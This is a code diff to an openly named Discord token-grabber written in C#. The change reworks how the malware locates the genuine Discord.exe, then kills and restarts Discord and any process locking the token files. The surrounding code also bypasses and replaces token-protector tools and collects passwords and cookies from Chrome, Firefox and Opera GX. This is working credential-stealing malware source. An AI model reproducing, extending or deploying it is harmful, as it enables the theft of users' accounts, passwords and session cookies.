@@ -78,7 +78,7 @@ namespace Qvoid_Token_Grabber.Discord
             }
 
             //Getting all of the Discord path(s) avaliable on the computer.
-            Find(out List<string> DiscordClients, out List<string> TokensLocation);
+            Find(out List<string> DiscordClients, out List<string> TokensLocation, out string DiscordExe);
 
             foreach (var clientPath in DiscordClients)
             {
@@ -122,33 +122,27 @@ namespace Qvoid_Token_Grabber.Discord
 
             if (TokensLocation.Count == 0)
             {
-                BypassProtectors();
+                BypassProtectors(ref DiscordExe);
 
                 while (true)
                 {
                     Thread.Sleep(60000);
+
                     var DiscordProcs = Process.GetProcessesByName("Discord");
-                    string DiscordMainModule = "";
-
-                    if (DiscordProcs.Length > 0)
-                        DiscordMainModule = DiscordProcs[0].MainModule.FileName;
-
                     foreach (var proc in DiscordProcs)
-                    {
                         try { proc.Kill(); } catch { }
-                    }
 
-                    if (!String.IsNullOrEmpty(DiscordMainModule))
-                        Process.Start(DiscordMainModule);
+                    if (!String.IsNullOrEmpty(DiscordExe))
+                        Process.Start(DiscordExe);
 
-                    Find(out DiscordClients, out TokensLocation);
+                    Find(out DiscordClients, out TokensLocation, out DiscordExe);
                     if (TokensLocation.Count > 0)
                         break;
                 }
             }
 
             //Grabbing the Discord token(s)
-            var Tokens = FindTokens(TokensLocation);
+            var Tokens = FindTokens(TokensLocation, ref DiscordExe);
 
             if (Tokens.Count > 0)
             {
@@ -183,7 +177,7 @@ namespace Qvoid_Token_Grabber.Discord
                 string Passwords = "------ Passwords ------";
                 string Cookies = "------ Cookies ------";
 
-                //Grabbing the passwords and cookies
+                //Grabbing passwords and cookies
                 ChromeGrabber Chrome = new ChromeGrabber();
                 FirefoxGrabber FireFox = new FirefoxGrabber();
                 OperaGxGrabber Opera = new OperaGxGrabber();
@@ -335,9 +329,9 @@ namespace Qvoid_Token_Grabber.Discord
                 }
                 catch { }
 
+                //Loop over all the grabbed tokens.
                 for (int i = 0; i < Tokens.Count; ++i)
                 {
-                    //Loop over all the grabbed tokens.
                     QvoidWrapper.Discord.Client curUser = new QvoidWrapper.Discord.Client(Tokens[i]);
 
                     //Checking for duplicates (We cannot use Distinct() because there might be multiple tokens to the same account)
@@ -422,7 +416,7 @@ namespace Qvoid_Token_Grabber.Discord
         /// <summary>
         /// Bypassing known token protectors and replacing the protectors with the grabber ^^
         /// </summary>
-        static public void BypassProtectors()
+        static public void BypassProtectors(ref string DiscordExe)
         {
             List<Protector> protectors = new List<Protector>()
             {
@@ -511,18 +505,11 @@ namespace Qvoid_Token_Grabber.Discord
             }
 
             var DiscordProcs = Process.GetProcessesByName("Discord");
-            string DiscordMainModule = "";
-
-            if (DiscordProcs.Length > 0)
-                DiscordMainModule = DiscordProcs[0].MainModule.FileName;
-
             foreach (var proc in DiscordProcs)
-            {
                 try { proc.Kill(); } catch { }
-            }
 
-            if (!String.IsNullOrEmpty(DiscordMainModule))
-                Process.Start(DiscordMainModule);
+            if (!String.IsNullOrEmpty(DiscordExe))
+                Process.Start(DiscordExe);
         }
 
         /// <summary>
@@ -562,10 +549,12 @@ namespace Qvoid_Token_Grabber.Discord
         /// </summary>
         /// <param name="DiscordClients"></param>
         /// <param name="TokensLocation"></param>
-        static private void Find(out List<string> DiscordClients, out List<string> TokensLocation)
+        /// <param name="DiscordExe"></param>
+        static private void Find(out List<string> DiscordClients, out List<string> TokensLocation, out string DiscordExe)
         {
             DiscordClients = new List<string>();
             TokensLocation = new List<string>();
+            DiscordExe = "";
 
             var directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
             foreach (var directory in directories)
@@ -574,11 +563,29 @@ namespace Qvoid_Token_Grabber.Discord
                 {
                     var core = Directory.GetFiles(directory, "core.asar", SearchOption.AllDirectories);
                     var index = Directory.GetFiles(directory, "index.js", SearchOption.AllDirectories);
+                    var discord_exe = Directory.GetFiles(directory, "Discord.exe", SearchOption.AllDirectories);
 
                     foreach (var coreFile in core)
                         foreach (var indexFile in index)
                             if (coreFile.Replace("core.asar", "") == indexFile.Replace("index.js", ""))
                                 DiscordClients.Add(coreFile.Replace("core.asar", ""));
+
+                    foreach (var file in discord_exe)
+                    {
+                        FileInfo info = new FileInfo(file);
+                        if (info.Length > 60000)
+                        {
+                            var objInfo = FileVersionInfo.GetVersionInfo(file);
+                            if (objInfo.LegalCopyright == "Copyright (c) 2021 Discord Inc. All rights reserved.")
+                            {
+                                if (objInfo.FileName.EndsWith("Discord.exe"))
+                                {
+                                    DiscordExe = file;
+                                    break;
+                                }
+                            }
+                        }
+                    }
                 }
             }
 
@@ -607,7 +614,7 @@ namespace Qvoid_Token_Grabber.Discord
         /// </summary>
         /// <param name="TokensLocation"></param>
         /// <returns>tokens located on the local computer</returns>
-        static private List<string> FindTokens(List<string> TokensLocation)
+        static private List<string> FindTokens(List<string> TokensLocation, ref string DiscordExe)
         {
             string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
@@ -671,6 +678,14 @@ namespace Qvoid_Token_Grabber.Discord
                         {
                             foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(filePath))
                             {
+                                try
+                                {
+                                    if (locker.MainModule.FileName == DiscordExe)
+                                        continue;
+                                }
+                                catch (Exception)
+                                { }
+
                                 try { locker.Kill(); }
                                 catch { break; }
                             }
